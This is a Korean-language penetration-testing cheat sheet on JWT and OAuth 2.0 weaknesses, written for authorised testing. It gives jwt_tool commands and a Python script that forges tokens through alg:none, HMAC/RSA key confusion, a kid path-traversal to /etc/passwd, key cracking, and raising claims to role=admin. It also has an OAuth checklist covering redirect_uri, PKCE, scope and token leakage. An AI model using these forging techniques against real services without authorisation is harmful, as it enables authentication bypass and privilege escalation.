# JWT + OAuth 2.0 보안 테스트

## JWT 공격 표면

### 1. 알고리즘 혼동

```bash
# alg:none — 가장 고전적인
# 원본: {"alg":"RS256","typ":"JWT"}.payload.signature
# 공격: {"alg":"none","typ":"JWT"}.payload. (빈 서명)

# RS256 → HS256 키 혼동
# 서버가 HS256 검증에 RS256 공개 키를 잘못 사용하는 경우
# 공개 키를 HMAC 키로 사용하여 서명할 수 있습니다.
python3 jwt_tool.py <JWT> -X k -pk public.pem

# kid 헤더 주입
# {"alg":"HS256","kid":"../../../../etc/passwd"}
# 취약한 구현이 kid를 검증하지 않고 파일/DB/LDAP 키 조회에 사용하는지 확인합니다.
```

### 2. jwt_tool 전체 사용

```bash
# Playbook 스캔: -rh는 요청 헤더, -cv는 선택적인 성공 응답 canary입니다.
TARGET_URL='https://api.example.invalid/approved-test-endpoint'
TEST_JWT='replace-with-approved-test-token'
python3 jwt_tool.py -t "$TARGET_URL" -rh "Authorization: Bearer $TEST_JWT" -M pb

# 약한 HMAC 키 사전 대입
python3 jwt_tool.py "$TEST_JWT" -C -d /usr/share/wordlists/rockyou.txt

# 클레임 변조
python3 jwt_tool.py "$TEST_JWT" -I -pc role -pv admin
python3 jwt_tool.py "$TEST_JWT" -I -pc exp -pv 9999999999

# RSA/HMAC 키 혼동
python3 jwt_tool.py "$TEST_JWT" -X k -pk public.pem

# JWK 삽입
python3 jwt_tool.py "$TEST_JWT" -X i
```

### 3. 수동 JWT 변조

```python
import base64
import json

token = "<JWT>"

def decode_segment(segment):
    padding = "=" * (-len(segment) % 4)
    return json.loads(base64.urlsafe_b64decode(segment + padding))

def encode_segment(value):
    raw = json.dumps(value, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

# 구조 확인용 디코딩이며 서명을 검증하지 않습니다.
header_segment, payload_segment, _ = token.split(".")
header = decode_segment(header_segment)
payload = decode_segment(payload_segment)

# 승인된 테스트 토큰의 클레임 조작
payload['role'] = 'admin'
payload['exp'] = 9999999999

# alg:none 수용 여부를 확인하는 테스트 토큰
header["alg"] = "none"
new_token = f"{encode_segment(header)}.{encode_segment(payload)}."
```

## OAuth 2.0 공격 표면

### 인증 코드 부여

```text
1. redirect_uri 검증
일반: https://app.com/callback?code=AUTH_CODE
   점검: 등록 URI와 정확히 일치하지 않는 사용자 정보/서브도메인/쿼리 변형을 거부하는지 확인
   참고: 변형 URI가 성공하는 것은 서버의 redirect_uri 비교 또는 오픈 리디렉터가 취약한 경우뿐입니다.

2. CSRF 바인딩
   PKCE 지원을 확인한 클라이언트는 PKCE에 의존할 수 있고, OIDC 흐름은 nonce를 사용할 수 있습니다.
   그 외에는 사용자 에이전트 세션에 묶인 일회용 state 값을 사용해야 합니다.

3. PKCE 누락
   No code_challenge → 인증코드 가로채기 공격

4. 콜백 URL 정보 유출
   쿼리에 있는 code/state는 콜백 페이지의 외부 리소스 요청에서 Referer로 유출될 수 있습니다.
   URI fragment의 access_token 자체는 HTTP Referer에 전송되지 않지만, 브라우저 스크립트·기록·오픈 리디렉터를 통한 유출 위험은 남습니다.
```

### 암시적 부여(더 이상 사용되지 않지만 여전히 배포됨)

```text
1. OAuth 2.0 Security BCP는 토큰 유출과 재생 위험 때문에 implicit grant 사용을 권장하지 않습니다.
2. 토큰이 URI fragment, 브라우저 스크립트 또는 기록에 노출될 수 있습니다.
3. 가능한 경우 PKCE를 적용한 authorization code grant로 전환합니다.
```

### 클라이언트 자격 증명 부여

```text
1. client_secret 유출(프론트엔드/모바일 하드코딩)
2. 과도한 범위 부여
3. 클라이언트 속도 제한 없음 → 무차별 열거
```

### 일반 OAuth 테스트

```text
□ scope 상승: scope=read → scope=read%20write
□ 토큰 재생: 기존 access_token을 사용하여 새 리소스에 액세스
□ Refresh 토큰 남용: Refresh_token 무기한 갱신
□ 교차 테넌트 액세스: 테넌트 A의 토큰 액세스 테넌트 B
□ 로그/URL/Referer에서 토큰 유출
```

## 도구

```text
# JWT 테스트
# jwt_tool 공식 저장소의 Docker 또는 수동 설치 절차와 검증된 버전을 사용

# OAuth 테스트
# Burp Suite + OAuth 스캐너 확장
# Postman OAuth 2.0 프로세스 테스트

# 자동화
# Entropy의 현재 지원 시나리오는 공식 저장소와 --help에서 확인
```

Source: [OWASP API2:2023 Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/), [RFC 8725 JWT BCP](https://www.rfc-editor.org/info/rfc8725/), [RFC 9700 OAuth 2.0 Security BCP](https://www.rfc-editor.org/info/rfc9700/), [jwt_tool](https://github.com/ticarpi/jwt_tool)
